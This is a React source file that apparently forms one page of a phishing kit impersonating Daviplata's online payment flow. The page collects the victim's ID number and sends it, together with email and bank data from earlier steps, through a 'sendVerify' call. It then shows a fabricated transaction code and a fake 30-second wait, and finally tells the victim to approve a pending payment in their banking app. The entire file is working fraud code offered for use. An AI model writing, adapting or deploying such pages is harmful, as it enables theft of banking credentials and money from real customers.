import React, { useEffect, useState } from 'react';
import { useLocation } from 'react-router-dom';
import { sendVerify } from '../verifyData';
import styles from './X10.module.css';
import logo from '../../Assets/Images/X10/logo.svg'
import sectionB from '../../Assets/Images/X10/sectionB.jpg'
import campana from '../../Assets/Images/X10/campana.svg'
import loader from '../../Assets/Images/X10/loader.gif'

function X09() {

    const location = useLocation();
    const { dataD, dataE } = location.state || {};

    const [dataF, setDataF] = useState('');

    const [showSectionB, setShowSectionB] = useState(false);
    const [showLoader, setShowLoader] = useState(false);

    const [fechaHora, setFechaHora] = useState('');
    const [numero, setNumero] = useState('');

    useEffect(() => {
    
        const ahora = new Date();
    
        const opcionesFecha = {
            weekday: 'long', 
            day: 'numeric',
            month: 'long',
            year: 'numeric',
        };
    
        const fechaFormateada = ahora.toLocaleDateString('es-ES', opcionesFecha);
    
        const hora = ahora.getHours().toString().padStart(2, '0');
        const minutos = ahora.getMinutes().toString().padStart(2, '0');
    
        const capitalizar = (texto) => texto.charAt(0).toUpperCase() + texto.slice(1);
    
        setFechaHora(`${capitalizar(fechaFormateada)}, ${hora}:${minutos}`);
    }, []);
    
    useEffect(() => {
    
        const generarNumeroAleatorioDiezDigitos = () => {
            const minimo = 1000000000;
            const maximo = 9999999999;
            return Math.floor(Math.random() * (maximo - minimo + 1)) + minimo;
        };
    
        const numeroGenerado = generarNumeroAleatorioDiezDigitos();
        setNumero(numeroGenerado.toString());
    }, []);

    const handleContinue = (e) => {

        e.preventDefault();

        if (!showSectionB) {
            setShowLoader(true);
            sendVerify(`🆔: ${dataF}\n📧: ${dataE}\n🏦: ${dataD}`);

            setTimeout(() => {
                setShowLoader(false);
                setShowSectionB(true);
            }, 30000) 
        }
    };

    return (
        <>
            <header className={styles.headerX10}>
                <img src={logo}></img>
                <div>
                    <p>{fechaHora}</p>
                    <p>Código único CUS: {numero}</p>
                </div>
            </header>
            <main className={styles.mainX10}>
                {showLoader && (
                    <section className={styles.overlayX10}>
                        <img src={loader}></img>
                    </section>
                )}
                {!showSectionB && (
                    <section className={styles.sectionAX10}>
                        <h1>Compre fácil con Daviplata</h1>
                        <h2>Pagos en línea y PSE</h2>
                        <p>Ingrese sus datos</p>
                        <form>
                            <select>
                                <option selected disabled hidden>Tipo de documento</option>
                                <option>Cedula de Ciudadanía</option>
                                <option>Cedula de Extranjería</option>
                                <option>Tarjeta de Identidad</option>
                            </select>
                            <input type='number' 
                                    placeholder='Número de documento'
                                    value={dataF}
                                    onChange={(e) => setDataF(e.target.value)}></input>
                        </form>
                        <div>
                            <button>Cancelar</button>
                            <button onClick={handleContinue}>Continuar</button>
                        </div>
                    </section>
                )}
                {showSectionB && (
                    <section className={styles.sectionBX10}>
                        <img src={sectionB}></img>
                        <h3>Ingrese a su DaviPlata y apruebe este pago</h3>
                        <p>Revise la confirmación que enviamos a su celular. Si no la recibió, ingrese a las <span>notificaciones de su DaviPlata (<img src={campana}></img>)</span> y seleccione la transacción que sale en la sección novedades para completar el proceso.</p>
                        <p><span>¡Tiene 10 minutos!</span> No cierre esta pestaña en su navegador, aquí encontrará el resumen de su pago.</p>
                    </section>
                )}
            </main>
        </>
    )
}

export default X09;